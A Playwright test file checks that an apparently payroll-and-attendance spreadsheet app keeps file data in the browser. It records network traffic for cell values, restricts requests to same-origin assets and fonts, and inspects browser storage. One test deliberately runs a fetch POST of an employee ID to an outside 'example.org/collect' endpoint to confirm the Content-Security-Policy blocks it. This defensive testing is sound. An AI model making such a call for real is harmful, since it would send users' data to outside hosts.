/**
 * AC-09 / spec §17: no request carries file content, nothing leaves the app origin, and nothing
 * from the files is persisted in browser storage after a run.
 */
import { expect, test, type Page } from '@playwright/test';
import {
  blockFonts,
  fixtures,
  recordRequests,
  runToResult,
  textCellValues,
  uploadFixtures,
  type RecordedRequest,
} from './helpers';

const FONT_HOST = /^fonts\.(googleapis|gstatic)\.com$/;

/** Cell values that must never appear in a request: every text cell of the 6 fixtures. */
const SECRETS = textCellValues([...fixtures('bang_luong_'), ...fixtures('cham_cong_')]);

function leaks(requests: RecordedRequest[]): string[] {
  const found: string[] = [];
  for (const r of requests) {
    const haystacks = [decodeURIComponent(r.url), r.url, r.body];
    for (const s of SECRETS) {
      const enc = Buffer.from(s, 'utf8').toString('latin1');
      if (
        haystacks.some((h) => h.includes(s) || h.includes(enc) || h.includes(encodeURIComponent(s)))
      ) {
        found.push(`${r.method} ${r.url} contains "${s}"`);
      }
    }
  }
  return found;
}

async function fullSession(page: Page): Promise<void> {
  await uploadFixtures(page);
  await runToResult(page);
  // Exercise row paging + filters + both downloads (validation report is only shown on issues).
  await page.getByRole('tab', { name: /Chỉ có trong lương/ }).click();
  await page.getByRole('tab', { name: /Lệch/ }).click();
  await page.getByLabel('Chi nhánh').selectOption('CN02');
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: /^Tải Excel/ }).click(),
  ]);
  await download.path();
}

async function storageDump(page: Page): Promise<string> {
  return page.evaluate(async () => {
    const out: Record<string, unknown> = {};
    const dump = (s: Storage) =>
      Object.fromEntries(
        Array.from({ length: s.length }, (_, i) => s.key(i)!).map((k) => [k, s.getItem(k)]),
      );
    out.local = dump(localStorage);
    out.session = dump(sessionStorage);
    out.idb = (await indexedDB.databases()).map((d) => d.name);
    out.caches = 'caches' in self ? await caches.keys() : [];
    out.sw = (await navigator.serviceWorker?.getRegistrations())?.length ?? 0;
    out.cookie = document.cookie;
    return JSON.stringify(out);
  });
}

test.describe('AC-09 data stays in the browser', () => {
  test('fonts blocked: every request is same-origin GET of a static asset, none carries cell values', async ({
    page,
  }) => {
    await blockFonts(page);
    const requests = recordRequests(page);
    await fullSession(page);

    expect(SECRETS.length).toBeGreaterThan(100); // sanity: names + IDs were collected
    expect(SECRETS).toContain('NV00001');
    expect(leaks(requests)).toEqual([]);

    const origin = new URL(page.url()).origin;
    const offOrigin = requests.filter((r) => {
      const u = new URL(r.url);
      if (u.protocol === 'blob:' || u.protocol === 'data:') return false;
      if (FONT_HOST.test(u.hostname)) return false; // aborted by the route above
      return u.origin !== origin;
    });
    expect(offOrigin.map((r) => `${r.method} ${r.url}`)).toEqual([]);

    // Same-origin traffic is only the app shell + static assets: no POST/PUT, no XHR/fetch to APIs.
    const sameOrigin = requests.filter((r) => r.url.startsWith(origin));
    expect(sameOrigin.filter((r) => r.method !== 'GET').map((r) => r.url)).toEqual([]);
    for (const r of sameOrigin) {
      const path = new URL(r.url).pathname;
      expect(path, `${r.resourceType} ${r.url}`).toMatch(
        /^\/($|run\/|assets\/[\w.-]+\.(js|css|woff2?)$)/,
      );
      expect(r.body).toBe('');
    }
    // The worker chunk is loaded (proves the recorder sees worker traffic too).
    expect(sameOrigin.some((r) => /\/assets\/worker-[\w-]+\.js$/.test(r.url))).toBe(true);

    const dump = await storageDump(page);
    for (const s of SECRETS) expect(dump.includes(s), `storage contains "${s}"`).toBe(false);
    expect(JSON.parse(dump)).toEqual({
      local: {},
      session: {},
      idb: [],
      caches: [],
      sw: 0,
      cookie: '',
    });
  });

  test('fonts allowed (production config): only Google Fonts CSS/font GETs leave the origin, with no data', async ({
    page,
  }) => {
    const requests = recordRequests(page);
    await fullSession(page);
    const origin = new URL(page.url()).origin;
    const external = requests.filter((r) => {
      const u = new URL(r.url);
      return !['blob:', 'data:'].includes(u.protocol) && u.origin !== origin;
    });
    for (const r of external) {
      expect(new URL(r.url).hostname, r.url).toMatch(FONT_HOST);
      expect(r.method).toBe('GET');
      expect(r.body).toBe('');
      expect(['stylesheet', 'font']).toContain(r.resourceType);
      // The stylesheet URL is the fixed one from index.html; font URLs come from that CSS.
      expect(r.fromWorker).toBe(false);
    }
    expect(leaks(requests)).toEqual([]);
    test.info().annotations.push({
      type: 'external-requests',
      description:
        external.map((r) => `${r.resourceType} ${new URL(r.url).host}`).join(', ') || 'none',
    });
  });

  test('CSP connect-src blocks the page and the worker origin from calling other hosts', async ({
    page,
  }) => {
    await blockFonts(page);
    const response = await page.goto('/');
    const csp = response?.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toMatch(/connect-src[^;]*\*/);
    const blocked = await page.evaluate(async () => {
      try {
        await fetch('https://example.org/collect', { method: 'POST', body: 'NV00001' });
        return false;
      } catch {
        return true;
      }
    });
    expect(blocked).toBe(true);
  });
});
